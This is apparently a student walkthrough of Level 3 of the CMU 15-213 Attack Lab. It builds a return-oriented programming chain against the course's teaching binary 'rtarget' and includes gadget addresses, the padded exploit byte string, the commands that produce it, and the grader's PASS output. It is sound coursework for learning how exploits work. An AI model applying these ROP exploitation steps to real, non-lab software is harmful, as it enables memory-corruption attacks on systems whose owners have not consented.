# Level 3

In this level, performing code-injection attacks on program `RTARGET` is much more difficult than
it is for `CTARGET` because:

* It uses randomization so that the stack positions differ from one run to another. This 
makes it imposible to determine where your injected code will be located.

* It marks the section of memory holding the stack as nonexecutable, so even if you could
set the program counter to the start of your injected code, the program would fail with a 
segmentation fault.

Therefore, in this level, we are going to use `return-oriented programming` (ROP) technique
rather than injecting new code by getting useful things done in a program under executing
existing code. In particular, we use the `gadget` in the program to exploit. Each gadget consists 
of a series of instruction bytes, with the final one being `0xc3`, encoding the `ret` instruction

The idea exploit we are going to do is: ( `%rax` will store our cookie, and then move to `%edi` and then passing them in function touch2 ) 

```asm
popq %rax
movq %rax, %edi
ret
```

However, as aboved discuss, we cannot inject the machine code in stack. We should use `ROP` by 
using benefit of function `gadget` in this code. Specifically, the `gadget1` will do instruction 
`popq %rax`, and the `gadget2` will do the instruction `movq %rax, %edi` and return. 

### 1st gadget

It is known that `popq %rax` is represented by `0x58`. In the disassembled code from (objdump -d rtarget > rtarget.d). There are a lot functions and ones we can pick them located between `start_farm` and `end_farm`. Now, we can search `0x58` : 

```asm
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```

We know that the byte `0x58` starts at 4th address. --> So, address for the first gadget is: `0x4019a7 + 4 ` = `0x4019ab` --> `AB 19 40 00`

### 2nd gadget

Similarly, the byte sequnce `48 89 c7` encodes the instruction `movq %rax, %rdi`. This sequence is followed by byte value c3, which encode `ret` instruction.  We can found in: 

```asm
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   
```
 
We realize that, the address for the second gadget is `0x4019a0 + 2 ` = `0x4019a2` --> `A2 19 40 00`. 

### String exploit

From all aboved information: the string exploit includes: 

	40 bytes + Address gadget1 (padding) + Coorkie + Address gadget2 (padding) + Touch2 function (padding)

```
danghai@ubuntu:~$ perl -e 'print "61 "x40,"ab 19 40 00 00 00 00 00 ", "fa 97 b9 59 00 00 00 00 ", "a2 19 40 00 00 00 00 00 ","ec 17 40 00 00 00 00 00"' >> hex_level3 
danghai@ubuntu:~$ ./hex2raw <hex_level3> raw_level3
```

Explanation exploit string:
 
```
61 61 61 61 61 61 61 61  	--> 40 bytes for buffer
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
ab 19 40 00 00 00 00 00 	--> 1st gadget
fa 97 b9 59 00 00 00 00 	--> Cookie
a2 19 40 00 00 00 00 00         --> 2nd gadget
ec 17 40 00 00 00 00 00         --> Touch2 address
```

Result: 

```
danghai@ubuntu:~$ ./rtarget -q < raw_level3
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```

 
